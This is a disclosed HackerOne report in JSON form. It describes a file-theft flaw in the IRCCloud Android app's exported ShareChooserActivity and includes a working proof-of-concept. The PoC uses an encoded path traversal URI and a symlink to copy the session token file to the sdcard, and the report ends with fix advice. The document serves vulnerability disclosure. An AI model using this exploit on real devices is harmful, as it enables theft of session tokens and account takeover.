{
  "reported_to": "IRCCloud",
  "reported_by": "bagipro ",
  "title": "[IRCCloud Android] Theft of arbitrary files leading to token leakage",
  "content": "\nBug description#\nHi, I'd like to report a vulnerability which allows to theft arbitrary protected files (and as a result takeover account, because all tokens will be leaked), similar to my bug reported to Harvest https://hackerone.com/reports/161710\nThis one is really tricky, passed two days to realize how to exploit that ;)\nActivity com.irccloud.android.activity.ShareChooserActivity is exported and designed to allow file sharing from third-party apps to IRC Cloud\nCode 969 Bytes\n1        <activity android:excludeFromRecents=\"true\" android:name=\"com.irccloud.android.activity.ShareChooserActivity\" android:theme=\"@style/dawnDialog\">\n2            <intent-filter>\n3                <action android:name=\"android.intent.action.VIEW\"/>\n4                <category android:name=\"android.intent.category.DEFAULT\"/>\n5            </intent-filter>\n6            <intent-filter>\n7                <action android:name=\"android.intent.action.SEND\"/>\n8                <category android:name=\"android.intent.category.DEFAULT\"/>\n9                <data android:mimeType=\"application/*\"/>\n10                <data android:mimeType=\"audio/*\"/>\n11                <data android:mimeType=\"image/*\"/>\n12                <data android:mimeType=\"text/*\"/>\n13                <data android:mimeType=\"video/*\"/>\n14            </intent-filter>\n15            <meta-data android:name=\"android.service.chooser.chooser_target_service\" android:value=\".ConversationChooserTargetService\"/>\n16        </activity>\nCode 491 Bytes\n1    protected void onResume() {\n2        //...\n3        if (getSharedPreferences(\"prefs\", 0).getString(\"session_key\", \"\").length() > 0) {\n4            \t//...\n5                this.mUri = (Uri) getIntent().getParcelableExtra(\"android.intent.extra.STREAM\"); // getting attacker provided uri\n6                if (this.mUri != null) {\n7                    this.mUri = MainActivity.makeTempCopy(this.mUri, this); // copying file from this uri to /data/data/com.irccloud.android/cache/\n8                }\nCode 795 Bytes\n1    public static Uri makeTempCopy(Uri fileUri, Context context, String original_filename) { // original_filename = mUri.getLastPathSegment()\n2        //...\n3        try {\n4            Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));\n5            Log.d(\"IRCCloud\", \"Copying file to \" + out);\n6            InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);\n7            OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);\n8            byte[] buffer = new byte[8192];\n9            while (true) {\n10                int len = is.read(buffer);\n11                if (len != -1) {\n12                    os.write(buffer, 0, len);\n13                //...\nIt means that the specified file will be copied to /data/data/com.irccloud.android/cache/ with original name. Original name is getLastPathSegment() from the specified uri. But there is one thing: this method decodes last path segment. This is my PoC:\nCode 1.75 KiB\n1    @Override\n2    protected void onCreate(Bundle savedInstanceState) {\n3        super.onCreate(savedInstanceState);\n4        setContentView(R.layout.activity_main);\n5\n6        // path to sdcard (encoded relative path from \"/data/data/com.irccloud.android/cache/\")\n7        String zhk = \"..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml\";\n8        // absolute path to a file, pointing to sumlink\n9        String appDir = \"/data/data/\" + getPackageName();\n10        String deepPath = appDir + \"/x/x/x/x/\";\n11\n12        new File(deepPath).mkdirs();\n13\n14        String sumlink = deepPath + zhk;\n15        try {\n16            File sumlinkFile = new File(Uri.decode(sumlink)).getCanonicalFile();\n17            sumlinkFile.getParentFile().mkdirs();\n18\n19            Runtime.getRuntime().exec(\"ln -s /data/data/com.irccloud.android/shared_prefs/prefs.xml \"\n20                    + sumlinkFile.getAbsolutePath()).waitFor();\n21        }\n22        catch(Exception e) {\n23            // should be never thrown\n24            throw new RuntimeException(e);\n25        }\n26        grant777PermissionToEverything(new File(appDir));\n27\n28        Uri uri = Uri.parse(\"file://\" + sumlink); // file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml\n29\n30        Intent intent = new Intent();\n31        intent.setClassName(\"com.irccloud.android\", \"com.irccloud.android.activity.ShareChooserActivity\");\n32        intent.putExtra(\"android.intent.extra.STREAM\", uri);\n33        startActivity(intent);\n34    }\n35\n36    private void grant777PermissionToEverything(File dist) {\n37        dist.setReadable(true, false);\n38        dist.setWritable(true, false);\n39        dist.setExecutable(true, false);\n40        if(dist.isDirectory()) {\n41            for(File child : dist.listFiles()) {\n42                grant777PermissionToEverything(child);\n43            }\n44        }\n45    }\n<image_0>\nIt works so:\n1) I start your activity with the following uri: file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml\n2) Canonical file from #2 (/data/data/com.attacker/sdcard/prefs.xml) is a symlink file pointing to the file I want to theft (/data/data/com.irccloud.android/shared_prefs/prefs.xml)\n3) In your app original_filename is equal to ../../../../sdcard/prefs.xml\n4)\nCode 121 Bytes\n1InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);\nBut openInputStream(...) automatically decodes the specified uri. So it will access my symlink file which points to /data/data/com.irccloud.android/shared_prefs/prefs.xml\n5)\nCode 195 Bytes\n1Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));\n2OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);\nIt is equal to\nCode 107 Bytes\n1Uri out = Uri.fromFile(new File(\"/data/data/com.irccloud.android/cache/\", \"../../../../sdcard/prefs.xml\"));\nSo it simply outputs the specified file to Sd card.\nHow to fix#\nJust specify e.g. current timestamp as a file name, but don't use provided by attacker. In current implementation attacker can force IRC Cloud app to copy arbitrary files to arbitrary directories. File /data/data/com.irccloud.android/shared_prefs/prefs.xml contains session_key. In normal situation this file is accessible only to IRC Cloud app. But when it's copied to e.g. Sd card it will be accessible to everyone. But Sd card is only simple example. Attacker can also force IRC Cloud app to copy a file to its internal directory.\nBTW this vulnerability also allows to overwrite arbitrary files. So attacker also can replace any your protected files and substitute for example history.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Privacy Violation"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/238/129/0ba86673ab2ad09bcf1133e57c595a36252db0e7/Screenshot_2017-11-09-23-21-21.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2017-11-09-23-21-21.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2017-11-09-23-21-21.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWZ7RUKE%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T184521Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGLSnYZfjMhCa0dN2OqzDAJnkOYTveMT%2B7eL0ajEFw5VAiBTVMNZnWgQxabUGEJ2Qswux%2FO5eu3GMgZoinMxWoNlQyqyBQgzEAMaDDAxMzYxOTI3NDg0OSIM6M7yzHfnJUoeDTsMKo8FtzcS1Zhg0qp8B14U4w500OCBCvP45LznD6a7p9TD4f7ryHdqKBeJzEGwvrlSUkJPelPrLg6rw9svX1OYdYEyggGoqMi4JwXiXe1683fOyYLlI790nFEfc6QY07n9AMZCc4jMw3i6UmLmzls9z2XhQ0PymKzOhJIIOJfaHjVY7WLjnp22kePhrLI9lIB3na5a4S2Fi47pY0kdP7FnY1nRHXtcuOwSKXwSDbgvM0FJJyfRj9mbkHaC3SVKaTvcStLUXs9BUJ5J2YNNDNRA%2BmvTJmb4SS%2FP4v4MSc%2FXiT0117Mg9Lv4Q%2FMi14W9WBRioV3i2UK5bXy%2B1po78ADnHWKHfSYDA%2BbP2PGsB50NyI4bV0Mza5T8ijs%2FIdZpO%2FLjIc4xWgjgmNpaALz3wWVIxLmC22p8UeWoJyrJOn68GuMfdYMGxSEq0YdnKfb3KJdc6WmA%2FWyl69pwN%2FVuYdREiEm3HnH9%2FL8NDg2T%2F5Otofwk6cvsJ9EHeuoD0Edkh0K%2B55bNJlu58PMexhiXh%2FlkTnb1nPU7lHV1tYh7s0LlQtgUs4Alfy0CNVK0hStQO2vakt1kfSdfdmJ5nyFZm2IY3ghv5zdqilqW8p%2Fo1UzOIRQ2vGsOinL8uOjHVwEJCWeFDJryZnmZB0eNVAP77RQn%2BYLUAtzFKnWY6xwq2qhe3I6pjcNM%2BKjbDbV3%2Bv3UwCKYxvRSpxGySMLWbEuR534iZLEAatx3K0P0y6gCDkRcN3OVcRPnFwvoS33Y6kq1l6bHKs%2FlsUt3PgdIlMwzFAgSaFiu3K08peraU3v5CaSgrhnS8smV5T0h8igQaHCjVhHVj6lNL26WM7cHMmWOLKGjMF6aWPNIcwU9TGohc%2F7capR0%2BDCH85C%2FBjqyAVpmoFAXjeHhdELw8Ed%2BcnC0QCu8ayNQH0MJUt2bahdqrabTYW3OIILox52lE62WsOn5tGIGjZ4eVnG0rWW%2BG6XsNR%2F14vDh9jbowcfsizhSbPljvYSVtZaEA1RqBmHNYFiTz1xp%2FjFnQ0yqILATHwUudn1pgu2%2Fz6qUSwQMMRCSpKMYfQ3Ncun5w%2BQx9MLEz8HP63nzr%2F0m4%2FVXwRs44Q37rNPr3Qyq7e%2FpnbxKfH8fFkg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dbb6b42bf2053fb23171340e295ece184352cfe1f411b84765c279ec3ff18c2e"
  },
  "disclosed_date": 1510777380,
  "report_url": "https://hackerone.com/reports/288955",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "MOBILE",
  "steps": [
    [
      1,
      "Create a symbolic link file in the attacker's app directory that points to the target file (/data/data/com.irccloud.android/shared_prefs/prefs.xml)"
    ],
    [
      2,
      "Craft a malicious URI with encoded path traversal (..%2F) that resolves to the symbolic link"
    ],
    [
      3,
      "Invoke IRCCloud's ShareChooserActivity with the malicious URI via an intent containing android.intent.extra.STREAM"
    ],
    [
      4,
      "The app copies the target file to an attacker-accessible location due to improper path handling"
    ]
  ],
  "vuln_description": "The vulnerability allows theft of arbitrary protected files from the IRCCloud Android app due to improper handling of file URIs in the ShareChooserActivity. An attacker can craft a malicious URI with path traversal that, when processed by the app, copies sensitive files (like session tokens) to attacker-controlled locations.",
  "reason": "This vulnerability requires understanding multiple complex components: Android's content URI handling, symbolic link manipulation, path traversal techniques, and the app's file copying mechanism. The attacker must carefully construct a malicious path that bypasses normal security checks while appearing legitimate to the app's file handling routines.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "161710"
}